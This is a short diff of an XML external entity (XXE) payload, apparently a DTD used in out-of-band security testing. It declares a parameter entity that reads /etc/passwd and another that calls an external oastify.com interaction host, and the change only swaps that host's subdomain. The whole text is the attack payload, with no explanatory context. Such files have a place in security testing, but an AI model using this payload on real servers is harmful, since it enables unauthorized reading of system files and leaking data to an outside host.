@@ -1,3 +1,3 @@
 <!ENTITY % p1 SYSTEM "file:///etc/passwd">
-<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'https://cs8ml6ywych8tua3sba9j5qufllc9cx1.oastify.com'>">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'https://367dzxcnc3vz7lou62o0xw4ltcz3n7bw.oastify.com'>">
 %p2;
